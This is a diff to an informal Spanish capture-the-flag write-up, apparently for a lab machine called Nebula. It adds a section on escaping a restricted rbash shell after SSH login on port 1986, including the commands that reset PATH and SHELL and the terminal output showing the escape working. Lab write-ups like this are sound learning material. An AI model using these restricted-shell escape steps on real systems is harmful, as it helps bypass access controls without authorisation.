@@ -138,6 +138,44 @@ dentro lo descargamos en la carpeta tmp y lo descomprimimos ahi, veremos que hay
 
 Ahora que tenemos el pin accedemos a la pagina. Se nos abre un panel de SIEM para ver las alertas de intrusiones.
 
-Hacemos el SIEM y entonces nos dara unas cuantas palabras, creamos un id_rsa, ponemos la ip y el id_rsa por ssh y utilizamos el usuario SSH, hemos probado bluffer y entramos por el puerto 1986 que es el que nos ha dado acceso a SSH por nmap. Entramos, hacemos el juego.
+Hacemos el SIEM y entonces nos dara unas cuantas palabras, probamos cual es la contraseña por ssh y utilizamos el usuario SSH, hemos probado bluffer y entramos por el puerto 1986 que es el que nos ha dado acceso a SSH por nmap. Entramos, hacemos el juego.
 
+~ Task 7 ~
 
+Nos encontramos que se encuentra con rbash, esto quiere decir que es una shell restrictiva, que no te deja hacer nada de nada.
+
+Pero empezamos hacer pruebas. Vemos que no nos deja hacer cd pero si que nos deja hacer el comando pwd. Hacemos un compgen -c 
+que te da un listado de los comandos que puedes hacer. 
+
+Entonces me dije; Existe una vulnerabilidad? vamos a probar variables de entorno, y hemos probado $PATH y $SHELL y parece que te da un pequeño resultado.
+Decido hacer un ssh ip@puerto -p 1986 -t bash para probar si podemos evadir de la restricción de bash.
+
+Entonces probamos de hacer un export PATH=/bin:/usr/bin y export SHELL=/bin/sh
+
+ejecutamos la variable $SHELL
+
+y nos sale una linea de comandos como así: $ probamos los comandos permitidos por compgen -c y nos da resultado con éxito!
+
+bluffer@Nebula-server:~$ ls
+[Restricted Permission]
+bluffer@Nebula-server:~$ whoami
+[Restricted Permission]
+bluffer@Nebula-server:~$ $PATH
+bash: /home/bluffer/cmds: Is a directory
+[Restricted Permission]
+bluffer@Nebula-server:~$ sh
+Command 'sh' is available in '/bin/sh'
+The command could not be located because '/bin' is not included in the PATH environment variable.
+sh: command not found
+[Restricted Permission]
+bluffer@Nebula-server:~$ export PATH=/bin:/usr/bin
+bluffer@Nebula-server:~$ export SHELL=/bin/sh
+bluffer@Nebula-server:~$ $SHELL
+$ ls
+cmds
+$ whoami
+bluffer
+$ ls -l
+total 4
+drwxr-xr-x 2 root root 4096 Apr  9 15:17 cmds
+$ 
